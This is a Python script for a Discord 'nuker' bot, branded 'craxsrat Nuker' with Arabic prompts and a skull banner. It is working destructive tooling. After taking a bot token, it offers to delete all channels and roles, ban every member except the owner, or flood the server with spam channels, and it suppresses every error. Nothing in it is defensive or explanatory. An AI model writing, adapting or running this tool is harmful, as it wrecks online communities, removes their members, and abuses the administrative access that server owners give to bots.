# devloper zinou
import discord
from discord.ext import commands
import os
import asyncio

token = input("🔑 أدخل توكن البوت: ")
prefix = "!"
intents = discord.Intents.all()

bot = commands.Bot(command_prefix=prefix, intents=intents)

ascii_skull = r"""
               ______
          _.-'______'-._
       .-'.-'      '-.'-.
     .' .' ☠️ HACKER ☠️ '. '.
    / /   .--------.   \ \
   | |   / .------. \   | |
    \ \  | |      | |  / /
     '._\ \______//_.'
         '-.____.-'
"""

@bot.event
async def on_ready():
    os.system("cls" if os.name == "nt" else "clear")
    print(ascii_skull)
    print(f"""
💀 craxsrat Nuker v1.0 - Logged in as {bot.user}

[1] Delete all channels
[2] Delete all roles
[3] Ban all members
[4] Create spam channels
[5] Exit
""")
    choice = input("اختر رقم العملية: ")

    guild = bot.guilds[0]

    if choice == "1":
        print("🧹 حذف جميع القنوات...")
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

    elif choice == "2":
        print("🧹 حذف جميع الرتب...")
        for role in guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
            except:
                pass

    elif choice == "3":
        print("🔨 حظر جميع الأعضاء...")
        for member in guild.members:
            try:
                if member != guild.owner:
                    await member.ban(reason="Nuked by craxsrat ☠️")
            except:
                pass

    elif choice == "4":
        print("💣 إنشاء قنوات سبام...")
        for i in range(20):
            try:
                await guild.create_text_channel(f"skull-spam-{i}")
            except:
                pass

    elif choice == "5":
        print("👋 الخروج...")
        await bot.close()
        return

    print("✅ العملية تمت!")
    await asyncio.sleep(5)
    await bot.close()

bot.run(token)
